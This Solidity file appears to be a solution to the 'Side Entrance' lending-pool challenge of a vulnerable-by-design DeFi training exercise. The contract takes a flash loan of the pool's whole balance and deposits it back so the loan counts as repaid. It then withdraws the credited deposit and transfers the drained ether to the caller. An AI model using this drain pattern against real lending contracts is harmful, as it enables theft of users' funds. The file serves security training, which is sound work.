// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {

    address payable public poolAddress;

    constructor(address poolAddr) {
        poolAddress = payable(poolAddr);
    }
    function execute() external payable {
        SideEntranceLenderPool pool = SideEntranceLenderPool(poolAddress);
        pool.deposit{value:msg.value}();
    }

    function attack() external {
        SideEntranceLenderPool pool = SideEntranceLenderPool(poolAddress);
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
 